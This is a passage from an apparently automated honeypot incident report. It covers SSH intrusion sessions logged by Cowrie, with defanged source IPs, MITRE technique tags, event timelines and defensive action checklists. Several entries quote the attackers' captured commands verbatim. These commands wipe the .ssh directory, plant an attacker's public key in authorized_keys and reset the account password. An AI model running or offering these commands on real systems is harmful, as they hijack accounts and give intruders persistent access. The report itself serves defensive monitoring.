| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "rtorrent\nygYSCVpeqBuT\nygYSCVpeqBuT"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:04:23` | `cowrie.session.connect` |
| `2026-08-13 08:04:24` | `cowrie.client.version` |
| `2026-08-13 08:04:24` | `cowrie.client.kex` |
| `2026-08-13 08:04:25` | `cowrie.login.success` |
| `2026-08-13 08:04:27` | `cowrie.session.params` |
| `2026-08-13 08:04:27` | `cowrie.command.input` |
| `2026-08-13 08:04:27` | `cowrie.command.failed` |
| `2026-08-13 08:04:27` | `cowrie.log.closed` |
| `2026-08-13 08:04:28` | `cowrie.session.params` |
| `2026-08-13 08:04:28` | `cowrie.command.input` |
| `2026-08-13 08:04:28` | `cowrie.session.file_download` |
| `2026-08-13 08:04:28` | `cowrie.log.closed` |
| `2026-08-13 08:04:45` | `cowrie.session.params` |
| `2026-08-13 08:04:45` | `cowrie.command.input` |
| `2026-08-13 08:04:46` | `cowrie.log.closed` |
| `2026-08-13 08:04:46` | `cowrie.session.params` |
| `2026-08-13 08:04:46` | `cowrie.command.input` |
| `2026-08-13 08:04:46` | `cowrie.command.input` |
| `2026-08-13 08:04:46` | `cowrie.command.failed` |
| `2026-08-13 08:04:47` | `cowrie.log.closed` |
| `2026-08-13 08:04:48` | `cowrie.session.params` |
| `2026-08-13 08:04:48` | `cowrie.command.input` |
| `2026-08-13 08:04:48` | `cowrie.log.closed` |
| `2026-08-13 08:04:49` | `cowrie.session.params` |
| `2026-08-13 08:04:49` | `cowrie.command.input` |
| `2026-08-13 08:04:50` | `cowrie.log.closed` |
| `2026-08-13 08:04:51` | `cowrie.session.params` |
| `2026-08-13 08:04:51` | `cowrie.command.input` |
| `2026-08-13 08:04:51` | `cowrie.log.closed` |
| `2026-08-13 08:04:52` | `cowrie.session.params` |
| `2026-08-13 08:04:52` | `cowrie.command.input` |
| `2026-08-13 08:04:52` | `cowrie.command.input` |
| `2026-08-13 08:04:53` | `cowrie.log.closed` |
| `2026-08-13 08:04:54` | `cowrie.session.params` |
| `2026-08-13 08:04:54` | `cowrie.command.input` |
| `2026-08-13 08:04:54` | `cowrie.log.closed` |
| `2026-08-13 08:04:55` | `cowrie.session.params` |
| `2026-08-13 08:04:55` | `cowrie.command.input` |
| `2026-08-13 08:04:56` | `cowrie.log.closed` |
| `2026-08-13 08:04:57` | `cowrie.session.params` |
| `2026-08-13 08:04:57` | `cowrie.command.input` |
| `2026-08-13 08:04:58` | `cowrie.log.closed` |
| `2026-08-13 08:04:58` | `cowrie.session.params` |
| `2026-08-13 08:04:58` | `cowrie.command.input` |
| `2026-08-13 08:04:59` | `cowrie.log.closed` |
| `2026-08-13 08:05:00` | `cowrie.session.params` |
| `2026-08-13 08:05:00` | `cowrie.command.input` |
| `2026-08-13 08:05:01` | `cowrie.log.closed` |
| `2026-08-13 08:05:02` | `cowrie.session.params` |
| `2026-08-13 08:05:02` | `cowrie.command.input` |
| `2026-08-13 08:05:02` | `cowrie.log.closed` |
| `2026-08-13 08:05:03` | `cowrie.session.params` |
| `2026-08-13 08:05:03` | `cowrie.command.input` |
| `2026-08-13 08:05:04` | `cowrie.log.closed` |
| `2026-08-13 08:05:05` | `cowrie.session.params` |
| `2026-08-13 08:05:05` | `cowrie.command.input` |
| `2026-08-13 08:05:06` | `cowrie.log.closed` |
| `2026-08-13 08:05:07` | `cowrie.session.params` |
| `2026-08-13 08:05:07` | `cowrie.command.input` |
| `2026-08-13 08:05:07` | `cowrie.log.closed` |
| `2026-08-13 08:05:08` | `cowrie.session.params` |
| `2026-08-13 08:05:08` | `cowrie.command.input` |
| `2026-08-13 08:05:08` | `cowrie.log.closed` |
| `2026-08-13 08:05:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d22dff5b7c25

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-08-13 08:07 |
| **Last Seen** | 2026-08-13 08:07 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:07:35` | `cowrie.session.connect` |
| `2026-08-13 08:07:39` | `cowrie.client.version` |
| `2026-08-13 08:07:39` | `cowrie.client.kex` |
| `2026-08-13 08:07:41` | `cowrie.login.success` |
| `2026-08-13 08:07:42` | `cowrie.session.params` |
| `2026-08-13 08:07:42` | `cowrie.command.input` |
| `2026-08-13 08:07:42` | `cowrie.command.failed` |
| `2026-08-13 08:07:42` | `cowrie.log.closed` |
| `2026-08-13 08:07:43` | `cowrie.session.params` |
| `2026-08-13 08:07:43` | `cowrie.command.input` |
| `2026-08-13 08:07:43` | `cowrie.session.file_download` |
| `2026-08-13 08:07:43` | `cowrie.log.closed` |
| `2026-08-13 08:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceea9b32dc0c

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-08-13 08:07 |
| **Last Seen** | 2026-08-13 08:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:07:45` | `cowrie.session.connect` |
| `2026-08-13 08:07:45` | `cowrie.client.version` |
| `2026-08-13 08:07:45` | `cowrie.client.kex` |
| `2026-08-13 08:07:47` | `cowrie.login.success` |
| `2026-08-13 08:07:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36572777e335

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-08-13 08:07 |
| **Last Seen** | 2026-08-13 08:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:07:47` | `cowrie.session.connect` |
| `2026-08-13 08:07:47` | `cowrie.client.version` |
| `2026-08-13 08:07:49` | `cowrie.client.kex` |
| `2026-08-13 08:07:50` | `cowrie.login.success` |
| `2026-08-13 08:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8065436a6b32

| Field | Detail |
|---|---|
| **Source IP** | `220.180.249[.]165` |
| **First Seen** | 2026-08-13 08:11 |
| **Last Seen** | 2026-08-13 08:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:11:18` | `cowrie.session.connect` |
| `2026-08-13 08:11:20` | `cowrie.client.version` |
| `2026-08-13 08:11:20` | `cowrie.client.kex` |
| `2026-08-13 08:11:23` | `cowrie.login.success` |
| `2026-08-13 08:11:24` | `cowrie.direct-tcpip.request` |
| `2026-08-13 08:11:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.180.249[.]165` to AbuseIPDB if not already reported
- [ ] Block `220.180.249[.]165` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-449c3dc3a3b5

| Field | Detail |
|---|---|
| **Source IP** | `45.170.50[.]2` |
| **First Seen** | 2026-08-13 08:11 |
| **Last Seen** | 2026-08-13 08:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:11:31` | `cowrie.session.connect` |
| `2026-08-13 08:11:32` | `cowrie.client.version` |
| `2026-08-13 08:11:32` | `cowrie.client.kex` |
| `2026-08-13 08:11:33` | `cowrie.login.success` |
| `2026-08-13 08:11:33` | `cowrie.direct-tcpip.request` |
| `2026-08-13 08:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.170.50[.]2` to AbuseIPDB if not already reported
- [ ] Block `45.170.50[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-745500de7cf0

| Field | Detail |
|---|---|
| **Source IP** | `221.182.185[.]190` |
| **First Seen** | 2026-08-13 08:11 |
| **Last Seen** | 2026-08-13 08:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:11:39` | `cowrie.session.connect` |
| `2026-08-13 08:11:39` | `cowrie.client.version` |
| `2026-08-13 08:11:39` | `cowrie.client.kex` |
| `2026-08-13 08:11:41` | `cowrie.login.success` |
| `2026-08-13 08:11:42` | `cowrie.direct-tcpip.request` |
| `2026-08-13 08:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.182.185[.]190` to AbuseIPDB if not already reported
- [ ] Block `221.182.185[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9634d9d686a9

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-13 08:16 |
| **Last Seen** | 2026-08-13 08:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:16:43` | `cowrie.session.connect` |
| `2026-08-13 08:16:44` | `cowrie.client.version` |
| `2026-08-13 08:16:44` | `cowrie.client.kex` |
| `2026-08-13 08:16:46` | `cowrie.login.success` |
| `2026-08-13 08:16:47` | `cowrie.direct-tcpip.request` |
| `2026-08-13 08:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d7b4b2e8edb

| Field | Detail |
|---|---|
| **Source IP** | `122.160.15[.]31` |
| **First Seen** | 2026-08-13 08:16 |
| **Last Seen** | 2026-08-13 08:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:16:52` | `cowrie.session.connect` |
| `2026-08-13 08:16:53` | `cowrie.client.version` |
| `2026-08-13 08:16:53` | `cowrie.client.kex` |
| `2026-08-13 08:16:55` | `cowrie.login.success` |
| `2026-08-13 08:16:56` | `cowrie.direct-tcpip.request` |
| `2026-08-13 08:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.15[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.15[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddfe9560490d

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-08-13 08:16 |
| **Last Seen** | 2026-08-13 08:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:16:55` | `cowrie.session.connect` |
| `2026-08-13 08:16:55` | `cowrie.client.version` |
| `2026-08-13 08:16:55` | `cowrie.client.kex` |
| `2026-08-13 08:16:56` | `cowrie.login.success` |
| `2026-08-13 08:16:57` | `cowrie.session.params` |
| `2026-08-13 08:16:57` | `cowrie.command.input` |
| `2026-08-13 08:16:57` | `cowrie.command.failed` |
| `2026-08-13 08:16:59` | `cowrie.log.closed` |
| `2026-08-13 08:16:59` | `cowrie.session.params` |
| `2026-08-13 08:16:59` | `cowrie.command.input` |
| `2026-08-13 08:17:00` | `cowrie.session.file_download` |
| `2026-08-13 08:17:00` | `cowrie.log.closed` |
| `2026-08-13 08:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0905b5af24df

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-08-13 08:17 |
| **Last Seen** | 2026-08-13 08:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:17:00` | `cowrie.session.connect` |
| `2026-08-13 08:17:00` | `cowrie.client.version` |
| `2026-08-13 08:17:00` | `cowrie.client.kex` |
| `2026-08-13 08:17:01` | `cowrie.login.success` |
| `2026-08-13 08:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b784ea62148b

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-08-13 08:17 |
| **Last Seen** | 2026-08-13 08:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:17:02` | `cowrie.session.connect` |
| `2026-08-13 08:17:02` | `cowrie.client.version` |
| `2026-08-13 08:17:02` | `cowrie.client.kex` |
| `2026-08-13 08:17:03` | `cowrie.login.success` |
| `2026-08-13 08:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-593de9d469f7

| Field | Detail |
|---|---|
| **Source IP** | `114.30.180[.]58` |
| **First Seen** | 2026-08-13 08:20 |
| **Last Seen** | 2026-08-13 08:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:20:45` | `cowrie.session.connect` |
| `2026-08-13 08:20:46` | `cowrie.client.version` |
| `2026-08-13 08:20:46` | `cowrie.client.kex` |
| `2026-08-13 08:20:48` | `cowrie.login.success` |
| `2026-08-13 08:20:49` | `cowrie.direct-tcpip.request` |
| `2026-08-13 08:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.180[.]58` to AbuseIPDB if not already reported
- [ ] Block `114.30.180[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe35f1d9b2de

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-08-13 08:26 |
| **Last Seen** | 2026-08-13 08:26 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "Passw0rd@1234\nu3CSgZgC2Pg4\nu3CSgZgC2Pg4"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:26:10` | `cowrie.session.connect` |
| `2026-08-13 08:26:12` | `cowrie.client.version` |
| `2026-08-13 08:26:12` | `cowrie.client.kex` |
| `2026-08-13 08:26:14` | `cowrie.login.success` |
| `2026-08-13 08:26:15` | `cowrie.session.params` |
| `2026-08-13 08:26:15` | `cowrie.command.input` |
| `2026-08-13 08:26:15` | `cowrie.command.failed` |
| `2026-08-13 08:26:16` | `cowrie.log.closed` |
| `2026-08-13 08:26:17` | `cowrie.session.params` |
| `2026-08-13 08:26:17` | `cowrie.command.input` |
| `2026-08-13 08:26:17` | `cowrie.session.file_download` |
| `2026-08-13 08:26:17` | `cowrie.log.closed` |
| `2026-08-13 08:26:34` | `cowrie.session.params` |
| `2026-08-13 08:26:34` | `cowrie.command.input` |
| `2026-08-13 08:26:35` | `cowrie.log.closed` |
| `2026-08-13 08:26:36` | `cowrie.session.params` |
| `2026-08-13 08:26:36` | `cowrie.command.input` |
| `2026-08-13 08:26:36` | `cowrie.command.input` |
| `2026-08-13 08:26:36` | `cowrie.command.failed` |
| `2026-08-13 08:26:36` | `cowrie.log.closed` |
| `2026-08-13 08:26:37` | `cowrie.session.params` |
| `2026-08-13 08:26:37` | `cowrie.command.input` |
| `2026-08-13 08:26:37` | `cowrie.log.closed` |
| `2026-08-13 08:26:38` | `cowrie.session.params` |
| `2026-08-13 08:26:38` | `cowrie.command.input` |
| `2026-08-13 08:26:39` | `cowrie.log.closed` |
| `2026-08-13 08:26:40` | `cowrie.session.params` |
| `2026-08-13 08:26:40` | `cowrie.command.input` |
| `2026-08-13 08:26:40` | `cowrie.log.closed` |
| `2026-08-13 08:26:41` | `cowrie.session.params` |
| `2026-08-13 08:26:41` | `cowrie.command.input` |
| `2026-08-13 08:26:41` | `cowrie.command.input` |
| `2026-08-13 08:26:42` | `cowrie.log.closed` |
| `2026-08-13 08:26:43` | `cowrie.session.params` |
| `2026-08-13 08:26:43` | `cowrie.command.input` |
| `2026-08-13 08:26:43` | `cowrie.log.closed` |
| `2026-08-13 08:26:44` | `cowrie.session.params` |
| `2026-08-13 08:26:44` | `cowrie.command.input` |
| `2026-08-13 08:26:45` | `cowrie.log.closed` |
| `2026-08-13 08:26:46` | `cowrie.session.params` |
| `2026-08-13 08:26:46` | `cowrie.command.input` |
| `2026-08-13 08:26:46` | `cowrie.log.closed` |
| `2026-08-13 08:26:47` | `cowrie.session.params` |
| `2026-08-13 08:26:47` | `cowrie.command.input` |
| `2026-08-13 08:26:48` | `cowrie.log.closed` |
| `2026-08-13 08:26:48` | `cowrie.session.params` |
| `2026-08-13 08:26:48` | `cowrie.command.input` |
| `2026-08-13 08:26:49` | `cowrie.log.closed` |
| `2026-08-13 08:26:50` | `cowrie.session.params` |
| `2026-08-13 08:26:50` | `cowrie.command.input` |
| `2026-08-13 08:26:50` | `cowrie.log.closed` |
| `2026-08-13 08:26:51` | `cowrie.session.params` |
| `2026-08-13 08:26:51` | `cowrie.command.input` |
| `2026-08-13 08:26:52` | `cowrie.log.closed` |
| `2026-08-13 08:26:52` | `cowrie.session.params` |
| `2026-08-13 08:26:52` | `cowrie.command.input` |
| `2026-08-13 08:26:53` | `cowrie.log.closed` |
| `2026-08-13 08:26:55` | `cowrie.session.params` |
| `2026-08-13 08:26:55` | `cowrie.command.input` |
| `2026-08-13 08:26:55` | `cowrie.log.closed` |
| `2026-08-13 08:26:56` | `cowrie.session.params` |
| `2026-08-13 08:26:56` | `cowrie.command.input` |
| `2026-08-13 08:26:56` | `cowrie.log.closed` |
| `2026-08-13 08:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6413c3d668cd

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-08-13 08:29 |
| **Last Seen** | 2026-08-13 08:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:29:18` | `cowrie.session.connect` |
| `2026-08-13 08:29:18` | `cowrie.client.version` |
| `2026-08-13 08:29:18` | `cowrie.client.kex` |
| `2026-08-13 08:29:19` | `cowrie.login.success` |
| `2026-08-13 08:29:21` | `cowrie.session.params` |
| `2026-08-13 08:29:21` | `cowrie.command.input` |
| `2026-08-13 08:29:21` | `cowrie.command.failed` |
| `2026-08-13 08:29:22` | `cowrie.log.closed` |
| `2026-08-13 08:29:22` | `cowrie.session.params` |
| `2026-08-13 08:29:22` | `cowrie.command.input` |
| `2026-08-13 08:29:23` | `cowrie.session.file_download` |
| `2026-08-13 08:29:23` | `cowrie.log.closed` |
| `2026-08-13 08:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.25.208[.]110` to AbuseIPDB if not already reported
- [ ] Block `203.25.208[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce24c45fab66

| Field | Detail |
|---|---|
| **Source IP** | `203.25.208[.]110` |
| **First Seen** | 2026-08-13 08:29 |
| **Last Seen** | 2026-08-13 08:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 08:29:23` | `cowrie.session.connect` |
| `2026-08-13 08:29:23` | `cowrie.client.version` |
